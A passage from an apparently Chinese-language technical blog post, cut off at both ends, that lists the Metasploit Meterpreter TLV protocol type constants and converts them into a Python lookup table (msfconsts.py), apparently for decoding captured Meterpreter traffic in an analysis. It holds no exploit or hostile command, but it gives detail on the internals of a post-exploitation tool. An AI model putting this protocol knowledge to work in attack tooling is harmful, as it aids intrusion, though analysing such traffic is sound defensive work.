class="line"><span class="comment">#define TLV_TYPE_KEY_NAME              (TLV_META_TYPE_STRING  | 1003)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_VALUE_NAME            (TLV_META_TYPE_STRING  | 1010)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_VALUE_TYPE            (TLV_META_TYPE_UINT    | 1011)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_VALUE_DATA            (TLV_META_TYPE_RAW     | 1012)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TARGET_HOST           (TLV_META_TYPE_STRING  | 1013)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Config</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_COMPUTER_NAME         (TLV_META_TYPE_STRING  | 1040)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_OS_NAME               (TLV_META_TYPE_STRING  | 1041)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_USER_NAME             (TLV_META_TYPE_STRING  | 1042)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ARCHITECTURE          (TLV_META_TYPE_STRING  | 1043)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_SID                   (TLV_META_TYPE_STRING  | 1045)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_LOCAL_DATETIME        (TLV_META_TYPE_STRING  | 1048)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_BUILD_TUPLE           (TLV_META_TYPE_STRING  | 1049)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Environment</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_ENV_VARIABLE          (TLV_META_TYPE_STRING  | 1100)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ENV_VALUE             (TLV_META_TYPE_STRING  | 1101)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ENV_GROUP             (TLV_META_TYPE_GROUP   | 1102)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define DELETE_KEY_FLAG_RECURSIVE      (1 &lt;&lt; 0)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Process</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_BASE_ADDRESS          (TLV_META_TYPE_QWORD   | 2000)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ALLOCATION_TYPE       (TLV_META_TYPE_UINT    | 2001)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROTECTION            (TLV_META_TYPE_UINT    | 2002)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_PERMS         (TLV_META_TYPE_UINT    | 2003)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_MEMORY        (TLV_META_TYPE_RAW     | 2004)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ALLOC_BASE_ADDRESS    (TLV_META_TYPE_QWORD   | 2005)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_STATE          (TLV_META_TYPE_UINT    | 2006)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_TYPE           (TLV_META_TYPE_UINT    | 2007)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ALLOC_PROTECTION      (TLV_META_TYPE_UINT    | 2008)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PID                   (TLV_META_TYPE_UINT    | 2300)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_NAME          (TLV_META_TYPE_STRING  | 2301)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_PATH          (TLV_META_TYPE_STRING  | 2302)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_GROUP         (TLV_META_TYPE_GROUP   | 2303)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_FLAGS         (TLV_META_TYPE_UINT    | 2304)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_ARGUMENTS     (TLV_META_TYPE_STRING  | 2305)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_ARCH          (TLV_META_TYPE_UINT    | 2306)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PARENT_PID            (TLV_META_TYPE_UINT    | 2307)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCESS_ARCH_NAME     (TLV_META_TYPE_STRING  | 2309)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_IMAGE_FILE            (TLV_META_TYPE_STRING  | 2400)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IMAGE_FILE_PATH       (TLV_META_TYPE_STRING  | 2401)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCEDURE_NAME        (TLV_META_TYPE_STRING  | 2402)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_PROCEDURE_ADDRESS     (TLV_META_TYPE_QWORD   | 2403)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IMAGE_BASE            (TLV_META_TYPE_QWORD   | 2404)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IMAGE_GROUP           (TLV_META_TYPE_GROUP   | 2405)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_IMAGE_NAME            (TLV_META_TYPE_STRING  | 2406)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_THREAD_ID             (TLV_META_TYPE_UINT    | 2500)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_THREAD_PERMS          (TLV_META_TYPE_UINT    | 2502)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EXIT_CODE             (TLV_META_TYPE_UINT    | 2510)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ENTRY_POINT           (TLV_META_TYPE_QWORD   | 2511)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_ENTRY_PARAMETER       (TLV_META_TYPE_QWORD   | 2512)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_CREATION_FLAGS        (TLV_META_TYPE_UINT    | 2513)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_REGISTER_NAME         (TLV_META_TYPE_STRING  | 2540)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_REGISTER_SIZE         (TLV_META_TYPE_UINT    | 2541)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_REGISTER_VALUE_32     (TLV_META_TYPE_UINT    | 2542)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_REGISTER              (TLV_META_TYPE_GROUP   | 2550)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_TERMINAL_ROWS         (TLV_META_TYPE_UINT    | 2600)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_TERMINAL_COLUMNS      (TLV_META_TYPE_UINT    | 2601)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Memory</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_NEEDLE     (TLV_META_TYPE_STRING   | 2650)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_RESULTS    (TLV_META_TYPE_GROUP    | 2651)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_MATCH_LEN  (TLV_META_TYPE_UINT     | 2652)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_START_ADDR (TLV_META_TYPE_QWORD    | 2653)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_SECT_LEN   (TLV_META_TYPE_QWORD    | 2654)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_MATCH_ADDR (TLV_META_TYPE_QWORD    | 2655)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MEMORY_SEARCH_MATCH_STR  (TLV_META_TYPE_STRING   | 2656)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Ui</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_IDLE_TIME             (TLV_META_TYPE_UINT    | 3000)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_KEYS_DUMP             (TLV_META_TYPE_STRING  | 3001)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_DESKTOP               (TLV_META_TYPE_STRING  | 3002)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_DESKTOP_SCREENSHOT         (TLV_META_TYPE_RAW  | 3002)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY (TLV_META_TYPE_UINT | 3008)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_KEYS_SEND             (TLV_META_TYPE_STRING  | 3014)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MOUSE_ACTION          (TLV_META_TYPE_UINT    | 3015)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MOUSE_X               (TLV_META_TYPE_UINT    | 3016)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_MOUSE_Y               (TLV_META_TYPE_UINT    | 3017)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_KEYEVENT_SEND         (TLV_META_TYPE_RAW     | 3018)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Event Log</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_SOURCENAME      (TLV_META_TYPE_STRING  | 4000)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_HANDLE          (TLV_META_TYPE_QWORD   | 4001)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_NUMRECORDS      (TLV_META_TYPE_UINT    | 4002)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_READFLAGS       (TLV_META_TYPE_UINT    | 4003)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_RECORDOFFSET    (TLV_META_TYPE_UINT    | 4004)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_RECORDNUMBER    (TLV_META_TYPE_UINT    | 4006)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_TIMEGENERATED   (TLV_META_TYPE_UINT    | 4007)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_TIMEWRITTEN     (TLV_META_TYPE_UINT    | 4008)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_ID              (TLV_META_TYPE_UINT    | 4009)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_TYPE            (TLV_META_TYPE_UINT    | 4010)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_CATEGORY        (TLV_META_TYPE_UINT    | 4011)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_STRING          (TLV_META_TYPE_STRING  | 4012)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_EVENT_DATA            (TLV_META_TYPE_RAW     | 4013)</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Power</span><br><span class="line"> */</span><br><span class="line"><span class="comment">#define TLV_TYPE_POWER_FLAGS           (TLV_META_TYPE_UINT    | 4100)</span></span><br><span class="line"><span class="comment">#define TLV_TYPE_POWER_REASON          (TLV_META_TYPE_UINT    | 4101)</span></span><br></pre></td></tr></table></figure>

<p>每一个都有一些常量(如TLV_META_TYPE_STRING)，在上面的高两个字节中定义，在低字节中定义一个数字。将复制所有这些，并将其带入vim，并将其移动以生成一个Python文件:</p>
<ul>
<li>msfconsts.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><span class="line">TLV_META_TYPE_NONE         = <span class="number">0</span></span><br><span class="line">TLV_META_TYPE_STRING       = (<span class="number">1</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">TLV_META_TYPE_UINT         = (<span class="number">1</span> &lt;&lt; <span class="number">17</span>)</span><br><span class="line">TLV_META_TYPE_RAW          = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>)</span><br><span class="line">TLV_META_TYPE_BOOL         = (<span class="number">1</span> &lt;&lt; <span class="number">19</span>)</span><br><span class="line">TLV_META_TYPE_QWORD        = (<span class="number">1</span> &lt;&lt; <span class="number">20</span>)</span><br><span class="line">TLV_META_TYPE_COMPRESSED   = (<span class="number">1</span> &lt;&lt; <span class="number">29</span>)</span><br><span class="line">TLV_META_TYPE_GROUP        = (<span class="number">1</span> &lt;&lt; <span class="number">30</span>)</span><br><span class="line">TLV_META_TYPE_COMPLEX      = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line">tlv_types = &#123;&#125;</span><br><span class="line">tlv_types[(TLV_META_TYPE_NONE    | <span class="number">0</span>)] = <span class="string">&quot;TLV_TYPE_ANY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">1</span>)] = <span class="string">&quot;TLV_TYPE_COMMAND_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">2</span>)] = <span class="string">&quot;TLV_TYPE_REQUEST_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">3</span>)] = <span class="string">&quot;TLV_TYPE_EXCEPTION&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">4</span>)] = <span class="string">&quot;TLV_TYPE_RESULT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">10</span>)] = <span class="string">&quot;TLV_TYPE_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">11</span>)] = <span class="string">&quot;TLV_TYPE_UINT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_BOOL    | <span class="number">12</span>)] = <span class="string">&quot;TLV_TYPE_BOOL&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">25</span>)] = <span class="string">&quot;TLV_TYPE_LENGTH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">26</span>)] = <span class="string">&quot;TLV_TYPE_DATA&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">27</span>)] = <span class="string">&quot;TLV_TYPE_FLAGS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">50</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">51</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">52</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_DATA&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">53</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_DATA_GROUP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">54</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_CLASS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">55</span>)] = <span class="string">&quot;TLV_TYPE_CHANNEL_PARENTID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">70</span>)] = <span class="string">&quot;TLV_TYPE_SEEK_WHENCE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">71</span>)] = <span class="string">&quot;TLV_TYPE_SEEK_OFFSET&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">72</span>)] = <span class="string">&quot;TLV_TYPE_SEEK_POS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">300</span>)] = <span class="string">&quot;TLV_TYPE_EXCEPTION_CODE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">301</span>)] = <span class="string">&quot;TLV_TYPE_EXCEPTION_STRING&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">400</span>)] = <span class="string">&quot;TLV_TYPE_LIBRARY_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">401</span>)] = <span class="string">&quot;TLV_TYPE_TARGET_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">402</span>)] = <span class="string">&quot;TLV_TYPE_MIGRATE_PID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">403</span>)] = <span class="string">&quot;TLV_TYPE_MIGRATE_LEN&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">430</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">431</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_URL&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">432</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_UA&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">433</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_COMM_TIMEOUT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">434</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_SESSION_EXP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">435</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_CERT_HASH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">436</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_PROXY_HOST&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">437</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_PROXY_USER&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">438</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_PROXY_PASS&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">439</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_RETRY_TOTAL&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">440</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_RETRY_WAIT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_GROUP   | <span class="number">441</span>)] = <span class="string">&quot;TLV_TYPE_TRANS_GROUP&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">460</span>)] = <span class="string">&quot;TLV_TYPE_MACHINE_ID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">461</span>)] = <span class="string">&quot;TLV_TYPE_UUID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">462</span>)] = <span class="string">&quot;TLV_TYPE_SESSION_GUID&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">550</span>)] = <span class="string">&quot;TLV_TYPE_RSA_PUB_KEY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_UINT    | <span class="number">551</span>)] = <span class="string">&quot;TLV_TYPE_SYM_KEY_TYPE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">552</span>)] = <span class="string">&quot;TLV_TYPE_SYM_KEY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_RAW     | <span class="number">553</span>)] = <span class="string">&quot;TLV_TYPE_ENC_SYM_KEY&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">600</span>)] = <span class="string">&quot;TLV_TYPE_HANDLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_BOOL    | <span class="number">601</span>)] = <span class="string">&quot;TLV_TYPE_INHERIT&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">630</span>)] = <span class="string">&quot;TLV_TYPE_PROCESS_HANDLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_QWORD   | <span class="number">631</span>)] = <span class="string">&quot;TLV_TYPE_THREAD_HANDLE&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span class="number">1200</span>)] = <span class="string">&quot;TLV_TYPE_DIRECTORY_PATH&quot;</span></span><br><span class="line">tlv_types[(TLV_META_TYPE_STRING  | <span 